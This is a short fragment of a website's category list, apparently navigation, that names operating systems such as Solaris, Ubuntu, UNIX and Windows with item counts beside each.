                                                                                                                                                            Solaris (1,601)
                                                                                                                                                            SUSE (1,444)
                                                                                                                                                            Ubuntu (7,482)
                                                                                                                                                            UNIX (8,979)
                                                                                                                                                            UnixWare (182)
                                                                                                                                                            Windows (6,166)
                                                                                                                                                            Other

